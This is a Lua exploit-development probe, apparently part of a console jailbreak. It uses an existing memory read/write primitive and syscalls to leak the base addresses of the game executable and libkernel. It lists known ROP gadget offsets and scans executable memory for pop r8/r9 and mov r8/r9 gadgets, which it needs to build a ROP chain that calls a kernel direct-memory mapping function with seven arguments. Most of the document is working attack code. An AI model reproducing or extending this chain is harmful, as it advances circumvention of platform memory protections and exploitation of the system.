-- CRASH_CLASS: HIGH
-- PROBE 531g: MapDirectMemory via thr_new child ROP chain
--
-- 531e: mmap dmem0 WORKS for allocated pages (R/W confirmed)
-- 531f: mmap dmem0 restricted to allocated pool (0x100000000-0x150000000)
--       Cannot map arbitrary physical RAM via dmem0 alone.
--
-- MapDirectMemory (libkernel+0x15020) = sceKernelMapNamedDirectMemory
-- Needs 7 args: (addr*, len, prot, flags, phys_offset, align, name)
-- fcall only passes 6 → 7th (name) = stack garbage → crash
--
-- Solution: thr_new(455) child thread with ROP chain that:
-- 1. Sets up all 7 args (rdi,rsi,rdx,rcx,r8,r9 + stack)
-- 2. Calls the function
-- 3. Writes result to shared memory
-- 4. Exits
--
-- Problem: no pop_r8/pop_r9 gadgets in eboot.
-- BUT: we CAN use a different approach:
-- Find a gadget in eboot that does: mov r8, [rsp+X] or similar
-- OR: write a minimal "call with 7 args" gadget using existing pieces
-- OR: use the raw syscall approach where r8/r9 come from the stack
--     in syscall calling convention (FreeBSD passes args in registers
--     same as SysV: rdi,rsi,rdx,rcx,r8,r9 — but for syscalls, rcx
--     is clobbered by syscall instruction, so r10 is used instead)
--
-- Actually, the SIMPLEST approach:
-- Just use a ROP chain that does:
--   pop rdi -> out_ptr
--   pop rsi -> len
--   pop rdx -> prot
--   pop rcx -> flags
--   ; r8 and r9 from previous state or gadgets
--   ; For r8/r9, we need to find alternative gadgets
--
-- SEARCH EBOOT for useful gadgets first!

print("=== PROBE 531g: ROP MAPDM ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function hexq(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print(string.format("pid=%d", pid))

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa, uint64(0)) end)
end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
local eb_size = rd(N(ib) + 0x110) or 0
if eb_size < 0 then eb_size = eb_size + 0x100000000 end
print(string.format("eb=0x%X%08X+0x%X", eb_hi, eb_lo, eb_size))

-- Get libkernel base
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local lk_lo = rd(N(ib) + 0x108) or 0
local lk_hi = rd(N(ib) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk_base = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
print(string.format("lk=0x%X%08X", lk_hi, lk_lo))

-- ============================================================
-- [A] Search eboot .text for r8/r9 gadgets
-- Known gadgets catalog (from 271g/272a):
--   pop_rax_ret     = +0x992
--   pop_rdi_ret     = +0xC9DFE
--   pop_rsi_ret     = +0xD77D
--   pop_rdx_ret     = +0x3B02D7
--   pop_rcx_ret     = +0xE64
--   pop_rdi_rbp_ret = +0x169
--   pop_rsi_rbp_ret = +0x78
--   bare_ret        = +0x42
--   mov_[rdi]_rax_ret = +0x92C67
--
-- Need: pop r8 (41 58 C3) or mov r8, ... or xchg r8, ...
-- Also useful: pop r9 (41 59 C3)
-- And: any gadget that loads from stack into r8/r9
-- ============================================================
print("")
print("[A] Search for r8/r9 gadgets")

local ebn = eb_hi * 0x100000000 + eb_lo

-- Search patterns:
-- 41 58 C3       = pop r8; ret
-- 41 59 C3       = pop r9; ret
-- 41 5A C3       = pop r10; ret
-- 41 5B C3       = pop r11; ret
-- 4C 8B 44 24 XX = mov r8, [rsp+XX]; ...
-- 4C 8B 4C 24 XX = mov r9, [rsp+XX]; ...
-- 49 89 C0 C3    = mov r8, rax; ret
-- 49 89 C1 C3    = mov r9, rcx; ret
-- 49 89 F0 C3    = mov r8, rsi; ret
-- 4C 89 C0       = mov rax, r8 (less useful but indicator)
-- 41 50 C3       = push r8; ret (less useful)

local scan_size = math.min(eb_size, 0x500000) -- 5MB
print(string.format("  scanning %d bytes of eboot .text...", scan_size))

local gadgets = {}
local found_count = 0

-- Scan in 4KB chunks for efficiency
for chunk_start = 0, scan_size - 4, 0x1000 do
    local chunk_end = math.min(chunk_start + 0x1003, scan_size - 1)
    for off = chunk_start, chunk_end do
        local b0 = rd(ebn + off)
        if b0 then
            -- Extract individual bytes
            if b0 < 0 then b0 = b0 + 0x100000000 end
            local bytes = {}
            bytes[0] = b0 % 256
            bytes[1] = math.floor(b0 / 256) % 256
            bytes[2] = math.floor(b0 / 65536) % 256
            bytes[3] = math.floor(b0 / 16777216) % 256

            -- Check byte patterns at each position within the dword
            for i = 0, 1 do -- check starting at byte 0 and 1
                local pos = off * 1 + i -- approximate
                -- We only have dword granularity, check within
                if i == 0 then
                    -- pop r8; ret = 41 58 C3
                    if bytes[0] == 0x41 and bytes[1] == 0x58 and bytes[2] == 0xC3 then
                        print(string.format("  POP R8; RET at +0x%X", off))
                        table.insert(gadgets, {name="pop_r8_ret", off=off})
                        found_count = found_count + 1
                    end
                    -- pop r9; ret = 41 59 C3
                    if bytes[0] == 0x41 and bytes[1] == 0x59 and bytes[2] == 0xC3 then
                        print(string.format("  POP R9; RET at +0x%X", off))
                        table.insert(gadgets, {name="pop_r9_ret", off=off})
                        found_count = found_count + 1
                    end
                    -- pop r10; ret = 41 5A C3
                    if bytes[0] == 0x41 and bytes[1] == 0x5A and bytes[2] == 0xC3 then
                        print(string.format("  POP R10; RET at +0x%X", off))
                        table.insert(gadgets, {name="pop_r10_ret", off=off})
                        found_count = found_count + 1
                    end
                    -- mov r8, rax; ret = 49 89 C0 C3
                    if bytes[0] == 0x49 and bytes[1] == 0x89 and bytes[2] == 0xC0 and bytes[3] == 0xC3 then
                        print(string.format("  MOV R8,RAX; RET at +0x%X", off))
                        table.insert(gadgets, {name="mov_r8_rax_ret", off=off})
                        found_count = found_count + 1
                    end
                    -- mov r9, rax; ret = 49 89 C1 C3
                    if bytes[0] == 0x49 and bytes[1] == 0x89 and bytes[2] == 0xC1 and bytes[3] == 0xC3 then
                        print(string.format("  MOV R9,RAX; RET at +0x%X", off))
                        table.insert(gadgets, {name="mov_r9_rax_ret", off=off})
                        found_count = found_count + 1
                    end
                end
                if i == 0 and bytes[1] == 0x41 then
                    -- pop r8; ret shifted by 1
                    if bytes[1] == 0x41 and bytes[2] == 0x58 and bytes[3] == 0xC3 then
                        print(string.format("  POP R8; RET at +0x%X (byte+1)", off))
                        table.insert(gadgets, {name="pop_r8_ret", off=off})
                        found_count = found_count + 1
                    end
                    if bytes[1] == 0x41 and bytes[2] == 0x59 and bytes[3] == 0xC3 then
                        print(string.format("  POP R9; RET at +0x%X (byte+1)", off))
                        table.insert(gadgets, {name="pop_r9_ret", off=off})
                        found_count = found_count + 1
                    end
                end
            end

            -- Skip 3 bytes for next dword (we process dword at a time)
            -- The loop already increments by 1 from the outer for
        end
        if found_count >= 20 then break end
    end
    if found_count >= 20 then break end
end

print(string.format("  total gadgets found: %d", found_count))

-- ============================================================
-- [B] Alternative: use mov r8, rax; ret to chain
-- pop rax -> value; mov r8, rax; ret; pop rax -> value; mov r9, rax; ...
-- But we need mov r9, rax too
-- ============================================================
print("")
print("[B] Alt: xchg/mov gadgets")

-- Search specifically for:
-- 49 89 C0 = mov r8, rax (3 bytes, might not end with ret)
-- 49 89 C1 = mov r9, rcx
-- 4C 89 C6 = mov rsi, r8
-- Let's do a targeted byte-level scan of first 1MB
local found_mov_r8 = {}
local found_mov_r9 = {}
local scan2 = math.min(eb_size, 0x200000)

for off = 0, scan2 - 4, 4 do
    local d = rd(ebn + off)
    if d then
        if d < 0 then d = d + 0x100000000 end
        local b0 = d % 256
        local b1 = math.floor(d / 256) % 256
        local b2 = math.floor(d / 65536) % 256
        local b3 = math.floor(d / 16777216) % 256

        -- 49 89 C0 C3 = mov r8, rax; ret
        if b0 == 0x49 and b1 == 0x89 and b2 == 0xC0 and b3 == 0xC3 then
            table.insert(found_mov_r8, off)
            if #found_mov_r8 <= 3 then
                print(string.format("  mov r8,rax;ret at +0x%X", off))
            end
        end
        -- shifted: XX 49 89 C0 where next byte is C3
        if b1 == 0x49 and b2 == 0x89 and b3 == 0xC0 then
            local next_d = rd(ebn + off + 4)
            if next_d then
                if next_d < 0 then next_d = next_d + 0x100000000 end
                if (next_d % 256) == 0xC3 then
                    table.insert(found_mov_r8, off + 1)
                    if #found_mov_r8 <= 3 then
                        print(string.format("  mov r8,rax;ret at +0x%X (shifted)", off + 1))
                    end
                end
            end
        end

        -- 49 89 C1 C3 = mov r9, rcx; ret
        if b0 == 0x49 and b1 == 0x89 and b2 == 0xC1 and b3 == 0xC3 then
            table.insert(found_mov_r9, off)
            if #found_mov_r9 <= 3 then
                print(string.format("  mov r9,rcx;ret at +0x%X", off))
            end
        end
        if b1 == 0x49 and b2 == 0x89 and b3 == 0xC1 then
            local next_d = rd(ebn + off + 4)
            if next_d then
                if next_d < 0 then next_d = next_d + 0x100000000 end
                if (next_d % 256) == 0xC3 then
                    table.insert(found_mov_r9, off + 1)
                    if #found_mov_r9 <= 3 then
                        print(string.format("  mov r9,rcx;ret at +0x%X (shifted)", off + 1))
                    end
                end
            end
        end
    end
end
print(string.format("  mov_r8_rax: %d, mov_r9_rcx: %d", #found_mov_r8, #found_mov_r9))

print("")
print("=== 531g DONE ===")
